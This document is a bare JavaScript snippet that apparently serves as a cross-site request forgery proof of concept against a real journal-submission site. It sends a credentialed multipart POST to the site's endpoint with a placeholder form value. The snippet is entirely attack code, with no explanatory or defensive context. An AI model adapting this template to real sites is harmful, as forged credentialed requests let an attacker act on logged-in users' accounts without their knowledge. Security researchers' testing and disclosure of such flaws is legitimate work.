var xhr = new XMLHttpRequest();
xhr.open("POST", "https://mc.manuscriptcentral.com/psrm", true);
xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryXYZ");
xhr.withCredentials = true;
var body = "------WebKitFormBoundaryXYZ\r\n";
body += "Content-Disposition: form-data; name=\"data\"\r\n\r\n";
body += "plumbus \r\n";
body += "------WebKitFormBoundaryXYZ--";
xhr.send(body);